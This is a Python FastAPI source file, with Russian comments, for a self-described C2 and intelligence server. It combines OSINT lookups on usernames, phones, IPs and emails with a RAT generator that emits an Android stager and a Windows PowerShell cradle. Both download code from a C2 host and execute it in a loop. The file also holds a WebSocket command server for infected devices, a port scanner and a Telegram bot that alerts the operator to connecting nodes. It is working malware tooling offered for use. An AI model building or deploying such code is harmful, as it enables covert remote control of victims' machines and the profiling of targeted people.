import os
import asyncio
import threading
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import requests
import socket
import phonenumbers
from phonenumbers import carrier, geocoder
from database import init_db, get_db
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

app = FastAPI(title="Unified C2 & Intelligence Core", version="2.1.0")
templates = Jinja2Templates(directory="templates")

# Хранилище активных WebSocket соединений зараженных устройств
class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[int, WebSocket] = {}

    async def connect(self, node_id: int, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[node_id] = websocket

    def disconnect(self, node_id: int):
        if node_id in self.active_connections:
            del self.active_connections[node_id]

    async def send_command(self, node_id: int, message: str):
        if node_id in self.active_connections:
            await self.active_connections[node_id].send_text(message)
            return True
        return False

manager = ConnectionManager()

@app.on_event("startup")
def startup():
    init_db()

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

# --- 1. ВСЕ OSINT МУЛЬТИСЕРВИСНЫЕ ЭНДПОИНТЫ ---
@app.post("/api/osint/username")
def osint_username(username: str = Form(...)):
    platforms = {
        "Telegram": f"https://t.me/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "VK": f"https://vk.com/{username}"
    }
    results = {}
    for name, url in platforms.items():
        try:
            resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=3)
            results[name] = {"url": url, "exists": resp.status_code == 200}
        except:
            results[name] = {"url": url, "exists": False}
    return {"target": username, "results": results}

@app.post("/api/osint/phone")
def osint_phone(phone: str = Form(...)):
    try:
        parsed = phonenumbers.parse(phone)
        return {
            "valid": phonenumbers.is_valid_number(parsed),
            "location": geocoder.description_for_number(parsed, "en"),
            "carrier": carrier.name_for_number(parsed, "en"),
            "international": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/osint/ip")
def osint_ip(ip: str = Form(...)):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
        return resp
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/osint/email")
def osint_email(email: str = Form(...)):
    domain = email.split('@')[-1] if '@' in email else ""
    return {
        "email": email,
        "domain": domain,
        "gravatar": f"https://www.gravatar.com/avatar/{email.lower().encode().hex()}?d=404",
        "mx_status": "active" if domain else "invalid"
    }

# --- 2. ГЕНЕРАТОР RAT И СЕТЕВЫЕ УТИЛИТЫ ---
@app.post("/api/rat/generate")
def generate_rat(device_type: str = Form(...), c2_server: str = Form(...)):
    if device_type == "android":
        template = f"""# Android Python/SL4A Stager
import urllib.request, subprocess, time
C2 = "{c2_server}"
while True:
    try:
        req = urllib.request.urlopen(f"http://{{C2}}/payload/exec")
        exec(req.read().decode())
    except: pass
    time.sleep(10)
"""
    else:
        template = f"""# Windows PowerShell Cradle
$c2 = "{c2_server}";
while($true) {{
    try {{
        $cmd = (New-Object Net.WebClient).DownloadString("http://$c2/payload/cmd");
        if ($cmd) {{ iex $cmd }}
    }} catch {{}}
    Start-Sleep -s 5
}}
"""
    return {"device": device_type, "template": template}

@app.post("/api/rat/command")
async def send_rat_command(node_id: int = Form(...), command: str = Form(...)):
    success = await manager.send_command(node_id, command)
    if not success:
        raise HTTPException(status_code=404, detail="Узел не подключен по WebSocket.")
    return {"status": "dispatched", "node_id": node_id, "command": command}

@app.post("/api/tools/portscan")
def port_scan(host: str = Form(...), ports: str = Form("21,22,80,443,3306")):
    port_list = [int(p.strip()) for p in ports.split(',')]
    results = {}
    for p in port_list:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        try:
            s.connect((host, p))
            results[p] = "OPEN"
        except:
            results[p] = "CLOSED"
        finally:
            s.close()
    return {"host": host, "ports": results}

# --- 3. WEBSOCKET C2 СЕРВЕР ---
@app.websocket("/ws/agent/{node_id}")
async def agent_endpoint(websocket: WebSocket, node_id: int):
    await manager.connect(node_id, websocket)
    token = os.getenv("TG_BOT_TOKEN")
    admin = os.getenv("TG_ADMIN_ID")
    
    if token and admin:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={
            "chat_id": admin,
            "text": f"🚨 [!] Узел #{node_id} вышел на связь!"
        })
    try:
        while True:
            data = await websocket.receive_text()
            with get_db() as conn:
                with conn.cursor() as cur:
                    cur.execute("INSERT INTO audit_logs (tool_name, target) VALUES (%s, %s)", 
                                ("c2_data", f"Node {node_id}: {data[:100]}"))
                    conn.commit()
    except WebSocketDisconnect:
        manager.disconnect(node_id)
        if token and admin:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={
                "chat_id": admin,
                "text": f"❌ [х] Узел #{node_id} отключился."
            })

# --- 4. ПОЛНОЦЕННЫЙ TELEGRAM БОТ (AIOGRAM) ---
TG_TOKEN = os.getenv("TG_BOT_TOKEN", "")
if TG_TOKEN:
    bot = Bot(token=TG_TOKEN)
    dp = Dispatcher()

    @dp.message(Command("start"))
    async def cmd_start(message: types.Message):
        await message.answer(
            "🥷 **Multitool & C2 Bot активен.**\n\n"
            "Команды:\n"
            "/nodes - Список активных узлов агентов\n"
            "/help - Справка по системе"
        )

    @dp.message(Command("nodes"))
    async def cmd_nodes(message: types.Message):
        active = list(manager.active_connections.keys())
        if not active:
            await message.answer("⚠️ Нет активных подключенных узлов.")
        else:
            await message.answer(f"🟢 Активные узлы в сети: {', '.join(map(str, active))}")

    def run_telegram_bot():
        asyncio.run(dp.start_polling(bot))

    # Запускаем бота в фоновом потоке, чтобы он не блокировал FastAPI
    threading.Thread(target=run_telegram_bot, daemon=True).start()

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)